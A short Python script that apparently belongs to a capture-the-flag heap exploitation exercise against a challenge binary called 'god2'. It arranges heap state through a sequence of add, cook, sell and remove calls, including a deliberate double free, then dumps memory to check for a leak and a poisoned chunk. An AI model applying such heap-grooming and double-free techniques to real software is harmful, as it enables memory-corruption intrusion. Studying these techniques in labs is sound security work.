import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
EXTRA=sys.argv[1] if len(sys.argv)>1 else ''
g=G('god2')
g.add(b'UNIQ777')
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')
g.cook(b'Beef noodles'); g.cook(b'Beef noodles'); g.cook(b'UNIQ777')   # D3@YY
g.add(b'R'*16+b'A'); g.add(b'SLOTXX')
g.sell(b'2')
g.rm(b'UNIQ777'); g.rm(b'UNIQ777')   # rm#1 frees recipe(0x90 lone), rm#2 frees D3
if EXTRA=='addFD':
    g.add(b'FD1234')   # see if poisoned
g.dump('rm-leak state EXTRA=%s'%EXTRA); g.close()
